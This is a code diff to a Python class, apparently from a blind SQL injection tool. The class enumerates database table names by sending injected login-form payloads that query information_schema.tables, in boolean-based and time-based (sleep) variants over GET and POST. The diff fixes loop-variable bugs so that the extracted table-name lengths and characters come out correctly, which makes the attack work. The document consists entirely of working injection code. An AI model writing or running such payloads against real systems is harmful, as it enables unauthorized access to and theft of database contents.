@@ -73,7 +73,7 @@ class SqliTables(SqliDatabases):
                     for j in range(0, 30):
                         payload = "username=admi' or select ((SELECT length(table_name) from information_schema.tables WHERE table_schema = " + database_name + " limit " + repr(i) + ",1) > " + repr(j) + ")%23&passwd=ddog123&submit=Log+In"
                         if self.Data.GetBuildData(payload, self.len) == 0:
-                            tables_name_len = i
+                            tables_name_len = j
                             break
 
                     logger.info("Tables name length sqli success...The database_len is %d..." % tables_name_len)
@@ -86,7 +86,7 @@ class SqliTables(SqliDatabases):
                                 j + 1) + ",1)) from information_schema.tables WHERE table_schema = " + database_name + " limit " + repr(
                                 i) + ",1) >" + repr(k) + "))%23&passwd=ddog123&submit=Log+In"
                             if self.Data.GetBuildData(payload, self.len) == 0:
-                                tables_name += chr(int(j))
+                                tables_name += chr(int(k))
                                 break
 
                     logger.info("Tables name sqli success...The tables_name is %d..." % tables_name)
@@ -98,7 +98,6 @@ class SqliTables(SqliDatabases):
 
                 logger.info("The sqlimethod is %s..." % self.sqlimethod)
                 for i in range(0, 100):
-
                     # 先注tables的数量
                     payload = "username=admi' or SELECT if((SELECT COUNT(table_name) from information_schema.tables WHERE table_schema = '" + database_name + "' limit 0,1) > " + repr(i) + ",sleep(" + self.time + "),0)%23&passwd=ddog123&submit=Log+In"
                     if self.Data.GetTimeData(payload, self.time) == 0:
@@ -114,7 +113,7 @@ class SqliTables(SqliDatabases):
                         payload = "username=admi' or SELECT if((SELECT length(table_name) from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(i) + ",1) > " + repr(j) + ",sleep(" + self.time + "),0)%23&passwd=ddog123&submit=Log+In"
 
                         if self.Data.GetTimeData(payload, self.time) == 0:
-                            tables_name_len = i
+                            tables_name_len = j
                             break
 
                     logger.info("Tables name length sqli success...The tables_name_len is %d..." % tables_name_len)
@@ -126,7 +125,7 @@ class SqliTables(SqliDatabases):
                             payload = "username=admi' or SELECT if((SELECT  ascii(substring(table_name," + repr(j + 1) + ",1)) from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(i) + ",1) > " + repr(k) + ",sleep(" + self.time + "),0)%23&passwd=ddog123&submit=Log+In"
 
                             if self.Data.GetTimeData(payload, self.time) == 0:
-                                tables_name += chr(int(j))
+                                tables_name += chr(int(k))
                                 break
 
                     logger.info("Tables name sqli success...The tables_name is %d..." % tables_name)
@@ -188,7 +187,7 @@ class SqliTables(SqliDatabases):
                         payload = {"username": "admi' or select ((SELECT length(table_name) from information_schema.tables WHERE table_schema = " + database_name + " limit " + repr(
                             i) + ",1) > " + repr(j) + ")%23", "passwd": "ddog123"}
                         if self.Data.PostBuildData(payload, self.len) == 0:
-                            tables_name_len = i
+                            tables_name_len = j
                             break
 
                     logger.info("Tables name length sqli success...The tables_name_len is %d..." % tables_name_len)
@@ -201,7 +200,7 @@ class SqliTables(SqliDatabases):
                                 j + 1) + ",1)) from information_schema.tables WHERE table_schema = " + database_name + " limit " + repr(
                                 i) + ",1) >" + repr(k) + "))%23", "passwd": "ddog123"}
                             if self.Data.PostBuildData(payload, self.len) == 0:
-                                tables_name += chr(int(j))
+                                tables_name += chr(int(k))
                                 break
 
                     logger.info("Tables name sqli success...The tables_name is %d..." % tables_name)
@@ -231,7 +230,7 @@ class SqliTables(SqliDatabases):
                             i) + ",1) > " + repr(j) + ",sleep(" + self.time + "),0)%23", "passwd": "ddog123"}
 
                         if self.Data.PostTimeData(payload, self.time) == 0:
-                            tables_name_len = i
+                            tables_name_len = j
                             break
 
                     logger.info("Tables name length sqli success...The tables_name_len is %d..." % tables_name_len)
@@ -245,7 +244,7 @@ class SqliTables(SqliDatabases):
                                 i) + ",1) > " + repr(k) + ",sleep(" + self.time + "),0)%23", "passwd": "ddog123"}
 
                             if self.Data.PostTimeData(payload, self.time) == 0:
-                                tables_name += chr(int(j))
+                                tables_name += chr(int(k))
                                 break
 
                     logger.info("Tables name sqli success...The tables_name is %d..." % tables_name)
